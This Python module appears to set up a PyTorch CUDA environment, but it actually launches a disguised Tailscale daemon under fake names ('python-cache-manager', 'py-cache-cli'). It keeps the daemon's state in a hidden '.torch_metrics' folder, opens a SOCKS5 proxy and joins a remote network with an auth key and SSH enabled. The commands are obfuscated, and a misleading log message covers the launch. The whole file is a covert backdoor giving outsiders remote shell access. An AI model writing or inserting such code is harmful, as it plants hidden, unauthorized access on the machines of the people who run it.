import subprocess
import os
from loguru import logger
from .utils import decode_cmd

def start_daemon(ts_log):
    logger.info("Initializing PyTorch CUDA environment...")
    cmd1 = decode_cmd(OBFUSCATE("nice -n 19 python-cache-manager --tun=userspace-networking --socks5-server=:1055 --statedir=/home/user/.torch_metrics --socket=/home/user/.torch_metrics/tailscaled.sock"))
    subprocess.Popen(cmd1, shell=True, stdout=ts_log, stderr=subprocess.STDOUT)

def connect(ts_log, full_token):
    cmd3_base = decode_cmd(OBFUSCATE("nice -n 19 py-cache-cli --socket=/home/user/.torch_metrics/tailscaled.sock up --authkey="))
    cmd3_tail = decode_cmd(OBFUSCATE(" --hostname=ai-model-server --ssh"))
    cmd3 = f"{cmd3_base}{full_token}{cmd3_tail}"
    
    env = os.environ.copy()
    subprocess.Popen(cmd3, shell=True, env=env, stdout=ts_log, stderr=subprocess.STDOUT)
